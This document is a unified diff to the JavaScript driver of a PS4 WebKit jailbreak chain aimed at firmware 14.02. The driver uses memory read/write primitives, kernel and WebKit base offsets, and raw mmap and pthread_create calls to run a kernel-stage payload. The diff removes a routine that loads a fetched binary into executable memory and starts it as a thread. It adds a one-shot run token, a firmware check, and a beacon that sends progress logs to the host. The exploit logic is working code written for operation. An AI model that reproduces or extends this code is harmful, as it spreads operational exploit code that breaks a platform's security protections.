@@ -1,7 +1,7 @@
-import { establishPrimitive } from "./core.js?v=1402";
-import { installWindowP, pairStatus } from "./mem.js?v=1402";
-import { int64 } from "./int64.js?v=1402";
-import { offsetsFor, PS4 } from "./ps4_offsets.js?v=1402";
+import { establishPrimitive } from "./core.js?v=debug1402a";
+import { installWindowP, pairStatus } from "./mem.js?v=debug1402a";
+import { int64 } from "./int64.js?v=debug1402a";
+import { offsetsFor, PS4 } from "./ps4_offsets.js?v=debug1402a";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -62,6 +62,19 @@ const FROM_LANDING = (function () {
   }
 })();
 
+const HANDOFF_OK = (function () {
+  if (params.get("afterglow") !== "run") return false;
+  const run = params.get("run") || "";
+  if (!/^[0-9]+-[0-9]+$/.test(run)) return false;
+  try {
+    const good = sessionStorage.getItem("debug-1402-tab-token") === run &&
+      localStorage.getItem("debug-1402-attempted") === run + ":started";
+    sessionStorage.removeItem("debug-1402-tab-token");
+    if (good) localStorage.setItem("debug-1402-attempted", run + ":armed");
+    return good;
+  } catch (_) { return false; }
+})();
+
 /* A page the browser restored must do nothing at all. Until this sat here,
    the refusal came only after the WebKit stage had already run in full --
    harmless to the kernel, but pointless work on a page nobody asked to run.
@@ -71,7 +84,7 @@ const FROM_LANDING = (function () {
    nothing. */
 const SENT_HOME = (function () {
   const want = params.get("afterglow");
-  if (!want || want === "probe" || FROM_LANDING) return false;
+  if (!want || want === "probe" || HANDOFF_OK) return false;
   try {
     /* Pin the page to the .fail look: the message lives in #msg, which is
        hidden in log mode, and the URL decides whether log mode is on. */
@@ -79,8 +92,8 @@ const SENT_HOME = (function () {
     const msgEl = document.getElementById("msg");
     if (msgEl) {
       msgEl.textContent =
-        "Restored by the browser. Nothing has been run -- " +
-        "going back to the start page.";
+        "This one-shot page was not opened from the Start button. " +
+        "Power off completely before another attempt.";
     }
   } catch (e) {}
   /* replace(), not assign(): the refused page must not stay in the history,
@@ -249,6 +262,15 @@ function mark(tag, detail) {
     ),
   );
 
+  if (HANDOFF_OK && /^[A-Za-z0-9_-]{1,40}$/.test(tag)) {
+    try {
+      const url = "beacon?run=" + encodeURIComponent(params.get("run")) +
+        "&tag=" + encodeURIComponent(tag) +
+        "&detail=" + encodeURIComponent(String(raw == null ? "" : raw).slice(0, 500));
+      fetch(url, { keepalive: true }).catch(function () {});
+    } catch (_) {}
+  }
+
   if (lines.length > 600) {
     lines.splice(
       0,
@@ -332,6 +354,11 @@ let allDone = false,
   let closeFd = null;
   try {
     const { key, off } = offsetsFor(navigator.userAgent);
+    if (params.get("afterglow") === "run" && key !== "14.02") {
+      mark("FW-BLOCK", "one-shot debug.bin route requires firmware 14.02");
+      finishUI(false);
+      return;
+    }
     mark("BUILD", "jb=skipjb2 base=ef1670a");
     mark("FW", key || "(not a PS4 UA)");
     if (!off) {
@@ -597,7 +624,8 @@ let allDone = false,
     // cannot be caught here and still needs a reboot -- this only recovers
     // the benign, detectable misses.
     const retryArg = parseInt(params.get("retry") || "", 10);
-    const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
+    const RETRY_MAX = params.get("afterglow") === "run" ? 0 :
+      (Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4);
     const RETRY_KEY = "jb1352-read-retry";
     const retryCount = () => {
       try {
@@ -948,74 +976,17 @@ let allDone = false,
       const a = new int64(r.lo, r.hi);
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
-    async function relaunchPayload() {
-      let blob = null;
-      try {
-        const r = await fetch(PAYLOAD_FILE);
-        if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
-      } catch (e) {}
-      if (!blob || blob[0] !== 0xe9) {
-        mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
-        return;
-      }
-      const sz = (blob.length + 0x3fff) & ~0x3fff;
-      const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
-      const entry = new int64(m.lo, m.hi);
-      if (m.i32 === -1 || entry.hi >>> 0 === 0) {
-        mark("JB-RELAUNCH", "mmap failed err=" + errno());
-        return;
-      }
-      for (let o = 0; o < blob.length; o += 8) {
-        let lo = 0,
-          hi = 0;
-        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-        p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
-      }
-      let bad = -1;
-      for (let o = 0; o < blob.length && bad < 0; o++)
-        if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
-      if (bad >= 0) {
-        mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
-        return;
-      }
-      const fn = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
-      const expect = libkernelBase.add32(off.k_pthread_create);
-      if (fn.low !== expect.low || fn.hi !== expect.hi) {
-        mark("JB-RELAUNCH", "pthread_create got=" + fn + " want=" + expect);
-        return;
-      }
-      const thr = new ArrayBuffer(8);
-      keepAlive.push(thr);
-      new Uint8Array(thr).fill(0);
-      const rc = callAddr(expect, [bufAddr(thr), 0, entry, 0]).i32;
-      const tdv = new DataView(thr);
-      const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
-      payloadRunning = rc === 0 && handle.hi >>> 0 > 0;
-      check(
-        "JB-RELAUNCH",
-        payloadRunning,
-        "file=" +
-          PAYLOAD_FILE +
-          " bytes=" +
-          blob.length +
-          " pthread_create=" +
-          rc +
-          " handle=" +
-          handle,
-      );
-    }
-
     if (params.get("afterglow")) {
       /* Arming requires a step from the landing page. A probe
          (afterglow=probe) fires no trigger and patches nothing, so a restored
          page may run that. */
       try {
-        const ag = await import("./afterglow-g.js?v=1402s");
+        const ag = await import("./afterglow-g.js?v=debug1402a");
         // Exactly what afterglow reaches for, counted rather than guessed.
         const agCtx = {
           p: p, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
           params: params, keepAlive: keepAlive, mark: mark, state: state,
+          firmware: fwKey,
           libkernelBase: libkernelBase, webkitBase: webkitBase,
           stubAddr: stubAddr, off: off,
           prepareMany: prepareMany, runPrepared: runPrepared,
@@ -1023,26 +994,23 @@ let allDone = false,
         if (params.get("afterglow") === "probe") {
           ag.probeAfterglow(agCtx);
         } else {
-          await ag.runAfterglow(agCtx);
+          const result = await ag.runAfterglow(agCtx);
+          const threadStarted = !!result && result.payload === true;
+          mark("DEBUG-THREAD", threadStarted
+            ? "pthread_create returned success; HEN status unconfirmed"
+            : "corrected debug.bin thread did not start");
+          payloadRunning = threadStarted;
         }
       } catch (agError) {
         mark("AG-FAIL", agError && agError.message ? agError.message : String(agError));
       }
       allDone = true;
-      finishUI(true);
-      // Swap the address out. The browser restores the last one after a
-      // reload, and an enabler that restarts SceShellUI causes exactly that
-      // reload -- so the last address must not be the one that runs the
-      // exploit again. Relative, so it lands on this folder's landing page
-      // however the files are served -- under a host's subdirectory just as
-      // well as at a root. The marker tells that page to hold its autostart;
-      // without it the restored landing page would count down and run the
-      // whole chain a second time on an already patched kernel.
-      try {
-        history.replaceState(null, "", "index.html?afterglow=done");
-      } catch (e) {}
-      // Stop here. Without this the host's own chain would still run
-      // afterwards -- afterglow IS the kernel stage, not a prelude to one.
+      mark("ONE-SHOT-END", payloadRunning
+        ? "pthread_create returned; HEN status unconfirmed. Leave result on screen"
+        : "No payload thread confirmed. Leave page open and fully power off PS4 before retry");
+      finishUI(payloadRunning);
+      // Leave the actual outcome visible. The consumed same-tab token and
+      // persistent cold-boot lock prevent a restored page from firing again.
       return;
     }
     mark("JB-END", "afterglow is the kernel stage -- without afterglow= nothing runs here");
